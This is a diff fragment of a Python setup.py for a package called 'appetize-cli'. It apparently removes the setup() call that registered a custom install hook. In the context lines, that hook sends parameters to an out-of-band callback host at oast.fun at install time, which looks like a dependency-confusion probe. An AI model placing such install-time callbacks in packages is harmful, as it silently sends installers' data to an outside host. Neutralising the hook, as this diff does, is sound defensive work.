@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/appetize-cli.php",params = ploads)
 
 
-setup(name='appetize-cli',
-      version='1.0.0',
-      description='White Hat Researcher',
-      author='whitehatguy',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                         
